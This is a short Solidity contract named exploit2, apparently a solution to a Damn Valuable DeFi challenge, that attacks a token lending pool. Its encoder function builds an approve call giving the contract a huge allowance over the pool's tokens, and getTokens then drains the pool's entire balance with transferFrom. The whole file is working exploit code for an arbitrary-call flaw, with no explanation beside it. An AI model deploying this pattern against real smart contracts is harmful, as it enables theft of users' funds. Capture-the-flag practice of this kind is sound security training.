// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";

contract exploit2{
    DamnValuableToken public immutable token;
    address private pool;

    constructor(DamnValuableToken _token, address _pool){
        token = _token;
        pool = _pool;
    }

    function getTokens(address receiver) public{
        uint256 balance = token.balanceOf(pool);
        token.transferFrom(pool,receiver,balance);
    }

    function encoder() public view returns(bytes memory){
        return abi.encodeWithSignature("approve(address,uint256)",address(this),1000000 *10 ** 18);
    }
}